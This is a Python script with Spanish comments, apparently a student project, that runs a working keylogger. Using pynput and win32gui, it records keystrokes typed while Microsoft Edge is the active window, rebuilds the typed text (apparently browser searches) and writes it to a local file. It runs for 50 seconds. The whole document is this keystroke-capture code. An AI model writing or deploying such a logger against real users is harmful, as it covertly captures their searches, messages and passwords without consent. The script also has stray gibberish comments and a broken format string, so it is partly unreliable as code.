#bibliotecas requeridas
import sys
import datetime
from pynput import keyboard
import logging
import sys
from threading import Thread
import time
#fecha para el archivo
date_capture= datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
#el archivo de guardado
f= open('C:/Users/victo/Documents/Universidad Santiago/Inteligencia Artificial/Keylogger/files/Busquedas.txt',"w")  
#auxiliar para llevar la lista previa a la escritura en el archivosjdjfjse

key_list=[]
  
#Funcion para detectar la ventana que estoy usando en windows
def active_window():

    active_window_name = None
    if sys.platform in ['Windows', 'win32', 'cygwin']:
        import win32gui
        window = win32gui.GetForegroundWindow() 
        active_window_name = win32gui.GetWindowText(window)
    else:
        print("sys.platform={platform} is unknown. Please report."
              .format(platform=sys.platform))
        print(sys.version)
    return active_window_name
#La accion que se ejecuta cuando presiono una tecla
def on_press(key):
    key=str(key)
    #el target para rastrear la ventana(el buscador)
    target="Microsoft​ Edge"
    global key_list
    if(active_window().find(target)!=-1):

        
        try:
            print("on pressed {}".format(key))  
            if(key=='Key.enter'):
                if(key_list):
                
                    string= "".join(key_list)
                    f.write(string + "\n")
                    key_list.clear()
                

            elif (key=='Key.space'):
                key_list.append(" ")   
                print("oprimiste un espacio y asi quedo key list: " % key_list)
            elif (key == 'Key.backspace'):
                # f.close()
                # quit()

                if(key_list):
                    key_list.pop()
                    print(key_list)
            else:
                key_list.append(key.replace("'",""))
        except AttributeError:
            print('special key {0} pressed'.format(
                key))
    else:
        key_list.clear()
#smaakdngnsndsksnvkjddnfmsnsadakcnsajdfngnj  
#               
#funcion de salida para el keyboard listener
def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False




with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    #iniciamos el timer antes del hilo de  escucha
    def time_out(period_sec: int):
        time.sleep(period_sec)  # Listen to keyboard for period_sec seconds
        listener.stop()
    Thread(target=time_out, args=(50,)).start()
    listener.join()    
    
